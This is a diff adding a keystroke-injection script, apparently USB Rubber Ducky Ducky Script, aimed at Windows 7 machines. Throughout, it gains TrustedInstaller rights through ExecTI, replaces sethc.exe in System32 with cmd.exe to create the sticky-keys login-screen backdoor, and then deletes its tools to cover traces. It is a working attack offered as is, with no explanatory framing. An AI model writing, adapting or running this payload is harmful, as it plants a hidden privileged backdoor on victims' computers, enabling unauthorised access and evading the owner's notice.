@@ -1,0 +1,43 @@
+DEFAULTDELAY 100
+DELAY 5000
+GUI r
+DELAY 50
+STRING cmd
+ENTER
+DELAY 1500
+
+REM location of ExecTI.exe
+STRING copy "Z:\ExecTI\Windows 7\ExecTi.exe
+ENTER
+
+STRING ExecTi.exe & exit
+ENTER
+DELAY 2000
+
+ALT y
+DELAY 2000
+
+REM open cmd as Trusted Installer
+ALT o
+STRING cmd.exe
+ENTER
+DELAY 2500
+
+REM is this easy mode?
+STRING cd C:\Windows\System32
+ENTER
+STRING copy cmd.exe sethc.exe /y & exit
+ENTER
+
+DELAY 2000
+ALT q
+
+REM cleanup
+GUI r
+DELAY 50
+STRING cmd
+ENTER
+DELAY 2500
+
+STRING del ExecTI* & exit
+ENTER
